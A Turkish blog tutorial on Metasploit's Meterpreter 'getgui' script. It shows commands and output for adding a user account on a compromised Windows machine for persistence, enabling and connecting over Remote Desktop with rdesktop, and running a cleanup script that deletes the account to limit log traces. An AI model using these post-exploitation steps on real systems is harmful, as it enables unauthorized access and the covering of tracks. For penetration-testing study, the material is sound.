---
draft: false

title:  'MSF Remote Desktop Modülü'
date: '2017-05-05T13:30:00+03:00'
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))

description:  "Metasploit Framework içerisinde Meterpreter ile bir shell açtığınızda yapılabilecek işlemlerden bir tanesi de uzak masaüstü bağlantısını hayata geçirmek olabilir. Bunun için\_getgui\_komutu oldukça kullanışlıdır." 
 
url:  /tr/msf-remote-desktop-modulu/
 
featured_image: /images/metasploit.jpg
categories:
    - 'Metasploit Framework'
tags:
    - cybersecurity
    - 'metasploit framework'
---


Metasploit Framework içerisinde Meterpreter ile bir shell açtığınızda yapılabilecek işlemlerden bir tanesi de uzak masaüstü bağlantısını hayata geçirmek olabilir. Bunun için `getgui` komutu oldukça kullanışlıdır.



Bu yazımızda `getgui` komutunu kullanarak sistemde bir kullanıcı oluşturup ardından `rdesktop` komutu ile bu bilgisayara nasıl bağlanabileceğimizi göreceğiz.



## Uzak Masaüstü Bağlantısı



Hedef bilgisayarda Meterpreter shell açtığınızı varsayıyoruz. Şimdi işe `getgui` komutunu kullanarak görsel bağlantı sağlamak için gerekli olan kullanıcı adı ve parolaya ihtiyacımız var. Böyle bir kullanıcı adı ve parolası oluşturduğunuzda kalıcılık sağlamış olursunuz.



##  Aracı



Öncelikle `getgui` yardım başlıklarına bakalım.


```bash
meterpreter **>** run getgui -h
Windows Remote Desktop Enabler Meterpreter Script
Usage: getgui -u  -p 
Or:    getgui -e

OPTIONS:

    -e   Enable RDP only.
    -f   Forward RDP Connection.
    -h   Help menu.
    -l   The language switch
         Possible Options: 'de_DE', 'en_EN' / default is: 'en_EN'
    -p   The Password of the user
```



##  Kullanıcı Ekleme



Genel olarak kullanımda `-u` kullanıcı adını, `-p` parolayı belirtmek için kullanılır. `getgui` komutunu aşağıdaki örneğe benzer şekilde kullandığınızda sisteme yeni bir kullanıcı eklemiş olursunuz.


```bash
meterpreter **>** run getgui -u loneferret -p password
**[*********]** Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
**[*********]** Carlos Perez carlos_perez@darkoperator.com
**[*********]** Language detection started
**[*********]**   Language detected: en_US
**[*********]** Setting user account **for **logon
**[*********]**   Adding User: loneferret with Password: password
**[*********]**   Adding User: loneferret to local group ''
**[*********]**   Adding User: loneferret to local group ''
**[*********]** You can now login with the created user
**[*********]** For cleanup use command: run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc
meterpreter **>**
```



##  Bağlantısı



Artık kullanıcı oluşturuldu. Aynı ağda bulunan başka bir bilgisayardan, bu kullanıcı adı ve parolayı kullanarak uzak masaüstü bağlantısı yapabilirsiniz.


```bash
root@kali:~#: rdesktop -u loneferret -p password 192.168.101.108
```



## Log Temizleme



Hedef sistemde ne kadar çok oynama yaparsanız, log kayıtlarına kaydedilme ihtimaliniz de o kadar artar. Bu sebeple mümkün olduğunca yetkisiz işlem yapmamalı veya gereken yerlere müdahale etmekle yetinmelisiniz.



`getgui` ile oluşturduğunuz kullanıcı ve oturum bilgilerini log kayıtların temizlemek isteyebilirsiniz. Bunun için aşağıdaki komut örneği işinize yarayacaktır. Örnekte kullanılan `/root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc` dosyasının en güncel halini yine aynı klasör içinden kontrol edebilirsiniz.


```bash
meterpreter **>** run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc
**[*********]** Running Command List ...
**[*********]**   Running command execute -H -f cmd.exe -a "/c net user hacker /delete"
Process 288 created.
meterpreter **>**```
